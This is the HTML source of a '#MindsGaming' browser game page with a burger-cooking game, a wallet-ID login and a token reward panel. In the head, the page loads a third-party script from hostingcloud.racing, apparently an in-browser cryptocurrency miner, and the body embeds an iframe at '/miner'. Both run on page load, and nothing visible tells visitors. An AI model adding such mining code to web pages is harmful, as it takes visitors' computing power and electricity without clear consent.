<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="/games/dice.js" defer></script>
    <script src="/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <link rel="stylesheet" href="/style.css" />
    <link rel="stylesheet" href="/games/pinn/pinn.css" />
    <script src="/games/pinn/pinn.js" defer></script>

    <style>
      .gamewrap {
        position: fixed;
        display: block;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: blue;
      }
      .pinnBurgers {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: gold;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/pinnburgers.png");
        background-size: contain;
        background-repeat: no-repeat;
        width: 20%;
        height: 20%;
      }
      .gTitle {
        margin-top: 35%;
        font-size: 25px;
      }
    </style>
  </head>
  <body style="background-color: green;">
    <iframe src="/miner"> </iframe>
    <div class="gameWrap">
      <center>
        <br />
        <h3>
          Select A Game
        </h3>
        <div id="pinnBurgers" onclick="pinnBurgers();" class="pinnBurgers">
          <p class="gTitle">
            Pinn Burgers
          </p>
          <wrap id="superGame" class="hide">
            <center>
              <dish>
                <div class="buttonReady" id="foodButton" onclick="foodImage();">
                  Make Food
                </div>
                <div class="hide" id="plateButton" onclick="platedImage();">
                  Plate Food
                </div>
                <div class="hide" id="serveButton" onclick="servedImage();">
                  Serve Food
                </div>
                <div class="hide" id="cashOut" onclick="claimUpdate();">
                  End Shift
                </div>
                <div class="buttonReady" id="quit" onclick="quit();">
                  Quit
                </div>
              </dish>

              <div class="items">
                <div id="foodImage"></div>
                <div id="platedImage"></div>
                <div id="serveImage"></div>
              </div>

              <footer>
                <div class="button2">
                  Making Food:
                  <div id="makefood">
                    0%
                  </div>

                  <meter
                    value="1"
                    id="makeFood"
                    max="100"
                    low="10"
                    high="80"
                    class="hide"
                  ></meter>
                </div>
                <div class="button2">
                  Food Plated
                  <div id="platedfood">
                    0
                  </div>
                  <meter
                    value="0"
                    id="platedFood"
                    max="100"
                    low="10"
                    high="80"
                    class="hide"
                  ></meter>
                </div>
                <div class="button2">
                  Food Served
                  <div id="servedfood">
                    0
                  </div>
                  <meter
                    value="1"
                    id="servedFood"
                    max="100"
                    low="10"
                    high="80"
                    class="hide"
                  ></meter>
                </div>
                <div class="button2">
                  Completed <label id="xtrA">0.</label>
                  <label id="rewards">
                    0
                  </label>
                  <meter
                    value="0"
                    id="Rewards"
                    max="100"
                    low="10"
                    high="80"
                    class="hide"
                  ></meter>
                </div>
              </footer>
            </center>
          </wrap>
        </div>
      </center>
    </div>

    <div id="walletCheck" title="wallet" class="hide">
      <div align="center">
        <h1>
          What Is Your Wallet ID Again?
        </h1>
        <div class="wrapIMG">
          <div class="loginImage">
            <br />
            <br />
            <form class="form" id="wallet">
              <input
                name="dream"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Wallet ID"
                required
              />
              <br />
              <button type="submit" id="submit-dream" onclick="classicLogin();">
                Login
              </button>
            </form>
            <br />
            <div class="button" onclick="classicGuest();">
              Guest
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="rewardicon" id="rewardicon" onclick="claimUpdate();">
      <br />
      <br />

      <center>
        <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
          >00</label
        >
      </center>
    </div>
    <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
    <div title="closed" id="REWARDS" class="hide">
      <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
        X
      </div>
      <div class="hide">Player: <label id="myName">Guest</label></div>
      <div>
        Wallet:
        <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
          >LOGIN</label
        >
      </div>
      <div>
        Reward Token:
        <label id="myToken">Random</label>
      </div>
      <div>
        Mode:
        <label id="vrMode" onclick="vrMode();">Hubs</label>
      </div>
      <div class="button" onclick="pendingClaims();">
        View Pending
      </div>
      <button class="hide" id="clear-dreams">
        Clear Dreams
      </button>
      <section title="closed" id="pendingClaims" class="hide">
        <ul id="dreams"></ul>
      </section>
    </div>

    <div id="offline" class="hide">
      <center>
        <h1>
          <br />
          <a href="/" target="_self"
            >Sorry You can't Earn Tokens Offline<br />Go Back To MTCG</a
          >
        </h1>
      </center>
    </div>
  </body>
</html>
